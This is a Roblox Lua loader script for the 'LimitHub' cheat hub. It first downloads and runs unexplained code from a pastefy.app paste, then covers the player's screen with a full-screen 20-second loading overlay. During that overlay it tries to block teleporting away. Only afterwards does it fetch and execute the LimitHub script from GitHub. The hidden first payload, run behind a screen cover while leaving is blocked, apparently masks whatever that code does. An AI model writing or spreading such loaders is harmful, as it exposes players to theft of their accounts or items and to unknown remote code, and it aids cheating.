-- Step 1: Run Pastefy first
local pastefyLoaded = false
local pastefySuccess, pastefyError = pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/8JqD2ajb/raw", true))()
    pastefyLoaded = true
end)

if not pastefySuccess then
    warn("[ERROR] Failed to load Pastefy script:", pastefyError)
end

-- Step 2: Create loading screen (even if Pastefy fails, still shows)
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")

ScreenGui.Name = "LoadingScreen"
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.Position = UDim2.new(0, 0, 0, 0)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame.Parent = ScreenGui

TextLabel.Parent = Frame
TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 24
TextLabel.Font = Enum.Font.SourceSansBold

-- Prevent leaving during loading
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
LocalPlayer.OnTeleport = function(State)
    if State == Enum.TeleportState.Started then
        return Enum.TeleportState.Failed
    end
end

-- Countdown for 20 seconds
for i = 20, 1, -1 do
    TextLabel.Text = "Loading... " .. i .. "s remaining"
    task.wait(1)
end

-- Remove loading screen
ScreenGui:Destroy()

-- Step 3: Run LimitHub only if Pastefy worked
if pastefyLoaded then
    local limitHubSuccess, limitHubError = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua", true))()
    end)
    if not limitHubSuccess then
        warn("[ERROR] Failed to load LimitHub script:", limitHubError)
    end
else
    warn("[STOPPED] Pastefy failed, not loading LimitHub.")
end
